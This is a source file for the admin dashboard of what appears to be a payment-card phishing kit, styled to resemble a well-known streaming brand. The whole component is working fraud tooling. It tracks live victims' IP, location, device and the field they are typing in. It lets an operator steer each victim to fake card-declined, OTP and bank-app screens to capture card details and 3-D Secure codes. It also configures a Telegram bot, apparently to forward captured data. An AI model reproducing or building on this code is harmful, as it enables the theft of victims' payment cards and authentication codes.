'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
import { Badge } from '@/components/ui/badge';
import { Trash2, LogOut, Lock, Unlock, Ban, CreditCard, LockIcon, Smartphone, CheckCircle, Globe, Monitor, Chrome, Copy, Settings, X, Eye, EyeOff, Save, AlertCircle, CheckCircle2, Loader2, XCircle, Keyboard } from 'lucide-react';
import { toast } from 'sonner';

interface UserSession {
  id: string;
  currentPage: string;
  lastActive: number;
  userState: 'invalid_card' | 'declined' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';
  ip?: string;
  country?: string;
  city?: string;
  postalCode?: string;
  device?: string;
  browser?: string;
  createdAt?: number;
  isActive?: boolean;
  lastSeen?: number;
  typingField?: string | null;
}

type ControlAction = 'invalid_card' | 'declined' | 'invalid_otp' | '3d-secure-otp' | '3d-secure-app' | 'block' | 'normal';

const ADMIN_AUTH_KEY = 'admin_auth_token';

export function AdminDashboard() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [sessions, setSessions] = useState<UserSession[]>([]);
  const [loading, setLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState('sessions');
  
  const [telegramBotToken, setTelegramBotToken] = useState('');
  const [telegramChatId, setTelegramChatId] = useState('');
  const [showBotToken, setShowBotToken] = useState(false);
  const [telegramLoading, setTelegramLoading] = useState(false);
  
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [newBlockedIp, setNewBlockedIp] = useState('');
  
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showCurrentPassword, setShowCurrentPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [passwordLoading, setPasswordLoading] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem(ADMIN_AUTH_KEY);
    if (token) verifyToken(token);
  }, []);

  const verifyToken = async (token: string) => {
    try {
      const response = await fetch('/api/admin/auth', {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        setIsAuthenticated(true);
        fetchSessions();
        fetchConfig();
        const interval = setInterval(fetchSessions, 2000);
        return () => clearInterval(interval);
      } else {
        localStorage.removeItem(ADMIN_AUTH_KEY);
      }
    } catch (error) {
      localStorage.removeItem(ADMIN_AUTH_KEY);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await fetch('/api/admin/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });
      if (response.ok) {
        const data = await response.json();
        localStorage.setItem(ADMIN_AUTH_KEY, data.token);
        setIsAuthenticated(true);
        setPassword('');
        fetchSessions();
        fetchConfig();
        toast.success('Successfully logged in');
        const interval = setInterval(fetchSessions, 2000);
        return () => clearInterval(interval);
      } else {
        toast.error('Incorrect password');
      }
    } catch (error) {
      toast.error('Login failed');
    } finally {
      setLoading(false);
    }
  };

  const fetchSessions = async () => {
    try {
      const response = await fetch('/api/admin/sessions');
      if (response.ok) {
        const data = await response.json();
        setSessions(data);
      }
    } catch (error) {}
  };

  const fetchConfig = async () => {
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps || []);
        setTelegramChatId(data.telegramChatId || '');
      }
    } catch (error) {}
  };

  const handleUpdateTelegramConfig = async () => {
    if (!telegramBotToken || !telegramChatId) {
      toast.error('Please fill in both Telegram fields');
      return;
    }
    setTelegramLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'PUT',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ telegramBotToken, telegramChatId }),
      });
      if (response.ok) {
        toast.success('Telegram configuration updated successfully!');
        setTelegramBotToken('');
      } else {
        toast.error('Failed to update configuration');
      }
    } catch (error) {
      toast.error('Failed to update configuration');
    } finally {
      setTelegramLoading(false);
    }
  };

  const handleUpdatePassword = async () => {
    if (!currentPassword || !newPassword || !confirmPassword) {
      toast.error('Please fill in all password fields');
      return;
    }
    if (newPassword !== confirmPassword) {
      toast.error('New passwords do not match');
      return;
    }
    setPasswordLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/password', {
        method: 'PUT',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ currentPassword, newPassword }),
      });
      if (response.ok) {
        toast.success('Admin password updated successfully!');
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        toast.error('Failed to update password');
      }
    } catch (error) {
      toast.error('Failed to update password');
    } finally {
      setPasswordLoading(false);
    }
  };

  const handleBlockIp = async () => {
    if (!newBlockedIp) {
      toast.error('Please enter an IP address');
      return;
    }
    setLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ action: 'block', ip: newBlockedIp }),
      });
      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        setNewBlockedIp('');
        toast.success(`IP ${newBlockedIp} has been blocked`);
      }
    } catch (error) {
      toast.error('Failed to block IP');
    } finally {
      setLoading(false);
    }
  };

  const handleUnblockIp = async (ip: string) => {
    setLoading(true);
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch('/api/admin/config', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        },
        body: JSON.stringify({ action: 'unblock', ip }),
      });
      if (response.ok) {
        const data = await response.json();
        setBlockedIps(data.blockedIps);
        toast.success(`IP ${ip} has been unblocked`);
      }
    } catch (error) {
      toast.error('Failed to unblock IP');
    } finally {
      setLoading(false);
    }
  };

  const handleControlAction = async (sessionId: string, action: ControlAction, ip?: string) => {
    setLoading(true);
    try {
      const response = await fetch('/api/admin/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, action, ip }),
      });
      if (response.ok) {
        toast.success(`Action sent successfully`);
        fetchSessions();
      }
    } catch (error) {
      toast.error('Failed to send control command');
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteSession = async (sessionId: string) => {
    try {
      const token = localStorage.getItem(ADMIN_AUTH_KEY);
      const response = await fetch(`/api/admin/sessions?id=${sessionId}`, {
        method: 'DELETE',
        headers: { 'Authorization': `Bearer ${token}` },
      });
      if (response.ok) {
        toast.success('Session deleted successfully');
        fetchSessions();
      } else {
        toast.error('Failed to delete session');
      }
    } catch (error) {
      toast.error('Failed to delete session');
    }
  };

  const handleLogout = () => {
    localStorage.removeItem(ADMIN_AUTH_KEY);
    setIsAuthenticated(false);
    toast.success('Logged out successfully');
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(text);
    toast.success('Copied to clipboard');
    setTimeout(() => setCopiedId(null), 2000);
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#121212] flex items-center justify-center p-4">
        <Card className="w-full max-w-md bg-[#181818] border-[#282828] text-white">
          <CardHeader className="space-y-1">
            <div className="flex justify-center mb-4">
              <div className="w-12 h-12 bg-[#1ed760] rounded-full flex items-center justify-center">
                <LockIcon className="text-black w-6 h-6" />
              </div>
            </div>
            <CardTitle className="text-2xl text-center font-bold">Admin Panel</CardTitle>
            <CardDescription className="text-center text-[#a7a7a7]">
              Enter your password to access the dashboard
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <Input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-[#282828] border-[#404040] text-white placeholder:text-[#a7a7a7] h-12"
                  autoFocus
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold h-12 rounded-full"
                disabled={loading}
              >
                {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : 'Login'}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#121212] text-white p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col md:flex-row md:items-center justify-between mb-8 gap-4">
          <div>
            <h1 className="text-3xl font-bold mb-2">Admin Dashboard</h1>
            <p className="text-[#a7a7a7]">Manage sessions and live visitor interactions</p>
          </div>
          <Button onClick={handleLogout} variant="outline" className="border-[#404040] hover:bg-[#282828] text-white rounded-full px-6">
            <LogOut className="w-4 h-4 mr-2" /> Logout
          </Button>
        </div>

        <Tabs defaultValue="sessions" value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="bg-[#181818] border-[#282828] p-1 rounded-xl">
            <TabsTrigger value="sessions" className="rounded-lg data-[state=active]:bg-[#282828] data-[state=active]:text-[#1ed760]">
              <Monitor className="w-4 h-4 mr-2" /> Active Sessions
            </TabsTrigger>
            <TabsTrigger value="telegram" className="rounded-lg data-[state=active]:bg-[#282828] data-[state=active]:text-[#1ed760]">
              <Settings className="w-4 h-4 mr-2" /> Telegram Config
            </TabsTrigger>
            <TabsTrigger value="security" className="rounded-lg data-[state=active]:bg-[#282828] data-[state=active]:text-[#1ed760]">
              <Lock className="w-4 h-4 mr-2" /> Security
            </TabsTrigger>
          </TabsList>

          <TabsContent value="sessions" className="space-y-4">
            <div className="grid grid-cols-1 gap-4">
              {sessions.length === 0 ? (
                <Card className="bg-[#181818] border-[#282828] text-white p-12 text-center">
                  <Monitor className="w-12 h-12 text-[#404040] mx-auto mb-4" />
                  <p className="text-[#a7a7a7]">No active sessions found</p>
                </Card>
              ) : (
                sessions.map((session) => (
                  <Card key={session.id} className="bg-[#181818] border-[#282828] text-white overflow-hidden hover:border-[#404040] transition-colors">
                    <CardContent className="p-0">
                      <div className="flex flex-col lg:flex-row">
                        <div className="p-6 flex-1 border-b lg:border-b-0 lg:border-r border-[#282828]">
                          <div className="flex items-center justify-between mb-4">
                            <div className="flex items-center gap-3">
                              <div className={`w-3 h-3 rounded-full ${session.isActive ? 'bg-[#1ed760] animate-pulse' : 'bg-[#404040]'}`} />
                              <span className="font-mono text-sm text-[#a7a7a7]">ID: {session.id.substring(0, 8)}...</span>
                            </div>
                            <div className="flex gap-2">
                              {session.typingField && (
                                <Badge className="bg-[#1ed760]/20 text-[#1ed760] border-[#1ed760]/30 animate-bounce">
                                  <Keyboard className="w-3 h-3 mr-1" /> Typing: {session.typingField}
                                </Badge>
                              )}
                              <Badge variant="outline" className="bg-[#282828] border-[#404040] text-white">
                                {session.currentPage}
                              </Badge>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div className="space-y-1">
                              <p className="text-xs text-[#a7a7a7] uppercase font-bold">Location</p>
                              <div className="flex items-center gap-2">
                                <Globe className="w-4 h-4 text-[#1ed760]" />
                                <span className="text-sm font-medium">{session.city}, {session.country}</span>
                              </div>
                            </div>
                            <div className="space-y-1">
                              <p className="text-xs text-[#a7a7a7] uppercase font-bold">IP Address</p>
                              <div className="flex items-center gap-2">
                                <Monitor className="w-4 h-4 text-[#1ed760]" />
                                <span className="text-sm font-medium">{session.ip}</span>
                              </div>
                            </div>
                            <div className="space-y-1">
                              <p className="text-xs text-[#a7a7a7] uppercase font-bold">Device</p>
                              <div className="flex items-center gap-2">
                                <Smartphone className="w-4 h-4 text-[#1ed760]" />
                                <span className="text-sm font-medium">{session.device} / {session.browser}</span>
                              </div>
                            </div>
                            <div className="space-y-1">
                              <p className="text-xs text-[#a7a7a7] uppercase font-bold">Last Seen</p>
                              <div className="flex items-center gap-2">
                                <Chrome className="w-4 h-4 text-[#1ed760]" />
                                <span className="text-sm font-medium">{new Date(session.lastActive).toLocaleTimeString()}</span>
                              </div>
                            </div>
                          </div>

                          <div className="mt-6 flex items-center gap-3">
                            <p className="text-xs text-[#a7a7a7] uppercase font-bold">Status:</p>
                            <Badge className={`
                                ${session.userState === 'normal' ? 'bg-blue-500/10 text-blue-500 border-blue-500/20' : ''}
                                ${session.userState === 'invalid_card' ? 'bg-red-500/10 text-red-500 border-red-500/20' : ''}
                                ${session.userState === 'declined' ? 'bg-orange-500/10 text-orange-500 border-orange-500/20' : ''}
                                ${session.userState === 'invalid_otp' ? 'bg-yellow-500/10 text-yellow-500 border-yellow-500/20' : ''}
                                ${session.userState === '3d-secure-otp' ? 'bg-purple-500/10 text-purple-500 border-purple-500/20' : ''}
                                ${session.userState === '3d-secure-app' ? 'bg-indigo-500/10 text-indigo-500 border-indigo-500/20' : ''}
                                ${session.userState === 'block' ? 'bg-red-900/10 text-red-900 border-red-900/20' : ''}
                              `}>
                              {session.userState.replace('_', ' ').toUpperCase()}
                            </Badge>
                          </div>
                        </div>

                        <div className="p-6 bg-[#212121] lg:w-80 flex flex-col justify-between gap-4">
                          <p className="text-xs text-[#a7a7a7] uppercase font-bold">Actions</p>
                          <div className="grid grid-cols-2 gap-2">
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-red-500 text-xs h-9" onClick={() => handleControlAction(session.id, 'invalid_card', session.ip)}>Invalid Card</Button>
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-orange-500 text-xs h-9" onClick={() => handleControlAction(session.id, 'declined', session.ip)}>Declined</Button>
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-yellow-500 text-xs h-9" onClick={() => handleControlAction(session.id, 'invalid_otp', session.ip)}>Invalid OTP</Button>
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-purple-500 text-xs h-9" onClick={() => handleControlAction(session.id, '3d-secure-otp', session.ip)}>OTP Page</Button>
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-indigo-500 text-xs h-9" onClick={() => handleControlAction(session.id, '3d-secure-app', session.ip)}>Bank App</Button>
                            <Button size="sm" variant="outline" className="border-[#404040] hover:bg-blue-500 text-xs h-9" onClick={() => handleControlAction(session.id, 'normal', session.ip)}>Normal</Button>
                          </div>
                          <div className="flex gap-2 pt-2 border-t border-[#333]">
                            <Button size="sm" variant="destructive" className="flex-1 bg-red-600 h-9" onClick={() => handleControlAction(session.id, 'block', session.ip)}><Ban className="w-3 h-3 mr-1" /> Block</Button>
                            <AlertDialog>
                              <AlertDialogTrigger asChild><Button size="sm" variant="outline" className="border-[#404040] h-9 px-3"><Trash2 className="w-3 h-3" /></Button></AlertDialogTrigger>
                              <AlertDialogContent className="bg-[#181818] border-[#282828] text-white">
                                <AlertDialogTitle>Delete Session?</AlertDialogTitle>
                                <div className="flex justify-end gap-3 mt-4">
                                  <AlertDialogCancel className="bg-transparent border-[#404040] text-white">Cancel</AlertDialogCancel>
                                  <AlertDialogAction className="bg-red-600 text-white" onClick={() => handleDeleteSession(session.id)}>Delete</AlertDialogAction>
                                </div>
                              </AlertDialogContent>
                            </AlertDialog>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </TabsContent>

          <TabsContent value="telegram">
            <Card className="bg-[#181818] border-[#282828] text-white">
              <CardHeader>
                <CardTitle>Telegram Configuration</CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm font-bold text-[#a7a7a7]">Bot Token</label>
                  <Input type="password" value={telegramBotToken} onChange={(e) => setTelegramBotToken(e.target.value)} className="bg-[#282828] border-[#404040] text-white" />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-bold text-[#a7a7a7]">Chat ID</label>
                  <Input value={telegramChatId} onChange={(e) => setTelegramChatId(e.target.value)} className="bg-[#282828] border-[#404040] text-white" />
                </div>
                <Button onClick={handleUpdateTelegramConfig} className="bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full px-8" disabled={telegramLoading}>
                  {telegramLoading ? <Loader2 className="w-4 h-4 mr-2 animate-spin" /> : <Save className="w-4 h-4 mr-2" />} Update
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="security">
            <Card className="bg-[#181818] border-[#282828] text-white">
              <CardHeader><CardTitle>Security Settings</CardTitle></CardHeader>
              <CardContent className="space-y-4">
                <div className="flex gap-2">
                  <Input placeholder="IP to block" value={newBlockedIp} onChange={(e) => setNewBlockedIp(e.target.value)} className="bg-[#282828] border-[#404040] text-white" />
                  <Button onClick={handleBlockIp} className="bg-red-600 text-white">Block</Button>
                </div>
                <div className="space-y-2 mt-4 max-h-[300px] overflow-y-auto">
                  {blockedIps.map((ip) => (
                    <div key={ip} className="flex items-center justify-between p-3 bg-[#282828] rounded-lg">
                      <span className="font-mono text-sm">{ip}</span>
                      <Button variant="ghost" size="sm" className="text-red-500" onClick={() => handleUnblockIp(ip)}>Unblock</Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
